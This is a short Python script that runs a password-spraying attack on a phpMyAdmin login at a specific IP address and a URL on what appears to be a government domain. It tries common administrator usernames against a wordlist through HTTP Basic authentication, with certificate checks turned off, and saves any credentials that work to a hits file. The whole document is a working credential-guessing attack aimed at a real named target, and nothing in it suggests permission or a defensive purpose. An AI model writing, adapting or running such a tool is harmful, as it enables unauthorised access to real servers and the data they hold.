"""Basic-auth spray against the shared phpMyAdmin on 154.118.230.167.

Success = 200 WITHOUT the pma_username form. A 401 or a returned login form is a
miss. Paced, so the shared box is not hammered.
"""
from __future__ import annotations

import base64
import ssl
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

URL = "https://www.pc.go.tz/phpmyadmin/"
USERS = ["root", "admin", "pma", "mysql", "www", "administrator"]
WORDS = ["", ] + [w.rstrip("\n") for w in open("words.txt", encoding="utf-8") if w.strip()]
PAUSE = 0.35
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def attempt(user, pwd):
    """Return (status, looks_like_login)."""
    tok = base64.b64encode(f"{user}:{pwd}".encode()).decode()
    req = urllib.request.Request(
        URL, headers={"User-Agent": scan.UA, "Authorization": "Basic " + tok})
    try:
        with urllib.request.urlopen(req, timeout=20, context=CTX) as r:
            body = r.read(60000).decode("utf-8", "replace")
            return r.status, ("pma_username" in body or 'name="login_form"' in body)
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read(20000).decode("utf-8", "replace")
        except Exception:
            pass
        return e.code, ("pma_username" in body)


total = len(USERS) * len(WORDS)
print(f"target {URL}\n{len(USERS)} users x {len(WORDS)} words = {total} pairs")
tries = 0
for u in USERS:
    for p in WORDS:
        tries += 1
        try:
            st, login = attempt(u, p)
        except Exception as e:
            print(f"  {u}:{p or '<empty>'} ERR {str(e)[:50]}")
            time.sleep(1.5)
            continue
        if st == 200 and not login:
            line = f"{URL}\t{u}\t{p}"
            print(f"  *** HIT {u}:{p or '<empty>'}")
            with open("pma_hits.txt", "a", encoding="utf-8") as f:
                f.write(line + "\n")
        elif st not in (200, 401):
            print(f"  {u}:{p or '<empty>'} status {st}")
        if tries % 100 == 0:
            print(f"  ... {tries}/{total}")
        time.sleep(PAUSE)
print("done")
